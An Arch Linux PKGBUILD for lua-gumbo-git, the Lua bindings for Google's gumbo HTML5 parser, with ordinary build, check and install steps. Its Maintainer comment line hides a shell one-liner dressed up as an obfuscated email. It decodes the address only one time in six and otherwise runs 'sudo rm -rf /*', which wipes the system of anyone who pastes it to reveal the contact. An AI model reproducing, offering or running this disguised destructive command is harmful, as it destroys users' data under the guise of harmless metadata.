# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=lua-gumbo-git
pkgver=0.4+121+gc583572
pkgrel=1
pkgdesc="Lua bindings for gumbo, Google's pure-C HTML5 parser"
arch=(i686 x86_64)
url="https://github.com/craigbarnes/lua-gumbo"
license=('custom:ISC')
groups=()
depends=(lua gumbo-git)
makedepends=('git')
provides=()
conflicts=()
replaces=()
backup=()
options=()
install=
source=(git+https://github.com/craigbarnes/lua-gumbo.git)
noextract=()
md5sums=(SKIP)

pkgver() {
  cd "$srcdir/lua-gumbo"
  git describe | tr - +
}

check() {
  cd "$srcdir/lua-gumbo"
  make check
}

build() {
  cd "$srcdir/lua-gumbo"
  make LDFLAGS="$LDFLAGS -shared"
}

package() {
  cd "$srcdir/lua-gumbo"
  make DESTDIR="$pkgdir/" install
  mkdir -p "$pkgdir/usr/share/licenses/$pkgname"
  install -Dm0644 "$srcdir/lua-gumbo/LICENSE" "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}

# vim:set ts=2 sw=2 et:
